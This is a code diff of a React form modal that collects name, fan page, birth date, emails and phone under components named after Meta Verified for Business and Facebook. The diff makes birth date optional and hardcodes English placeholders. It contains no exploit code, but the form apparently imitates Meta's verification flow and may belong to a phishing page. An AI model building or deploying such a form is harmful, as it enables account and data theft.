@@ -5,6 +5,7 @@ import CustomCheckbox from '#components/check-box/CustomCheckbox';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
 import { useAppStrings } from '@/hooks/useAppStrings';
+import { en } from '@/i18n/locales/en';
 import ActivationRefChip from '@/components/meta-verified-for-business/ActivationRefChip';
 import FacebookNotifyToggle from '@/components/meta-verified-for-business/FacebookNotifyToggle';
 import { getUserLocation, isUnresolvedLocation } from '@/utils/getLocation';
@@ -59,9 +60,6 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
         newErrors.emailBusiness = t.info.errEmailBizFmt;
       }
       if (!formData.fanpage.trim()) newErrors.fanpage = t.info.errFanpage;
-      if (!formData.day) newErrors.day = t.info.errDay;
-      if (!formData.month) newErrors.month = t.info.errMonth;
-      if (!formData.year) newErrors.year = t.info.errYear;
       const phoneDigits = normalizePhoneDigits(formData.phone);
       const phoneDigitCount = getPhoneDigitCount(formData.phone);
       if (!phoneDigits) {
@@ -128,7 +126,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               <input
                 type="text"
                 id='fullName'
-                placeholder={t.info.fullNamePh}
+                placeholder={en.info.fullNamePh}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.fullName}
                 onChange={handleChange}
@@ -141,7 +139,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               <input
                 type="text"
                 id='fanpage'
-                placeholder={t.info.fanpagePh}
+                placeholder={en.info.fanpagePh}
                 className="w-full outline-0 h-full tracking-wide"
                 value={formData.fanpage}
                 onChange={handleChange}
@@ -149,7 +147,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fanpage')}
 
-            <label className={labelClass}>{t.info.dob} {requiredMark}</label>
+            <label className={labelClass}>{t.info.dob}</label>
             <div className="mb-[10px] grid grid-cols-[minmax(0,0.85fr)_minmax(0,0.85fr)_minmax(0,1.3fr)] gap-[6px] sm:grid-cols-3 sm:gap-[10px]">
               <div className="min-w-0">
                 <div className={dobInputClass('day')}>
@@ -213,7 +211,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                   <input
                     type="email"
                     id='email'
-                    placeholder={t.info.emailPh}
+                    placeholder={en.info.emailPh}
                     className="w-full outline-0 h-full tracking-wide"
                     value={formData.email}
                     onChange={handleChange}
@@ -228,7 +226,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                   <input
                     type="email"
                     id='emailBusiness'
-                    placeholder={t.info.emailBizPh}
+                    placeholder={en.info.emailBizPh}
                     className="w-full outline-0 h-full tracking-wide"
                     value={formData.emailBusiness}
                     onChange={handleChange}
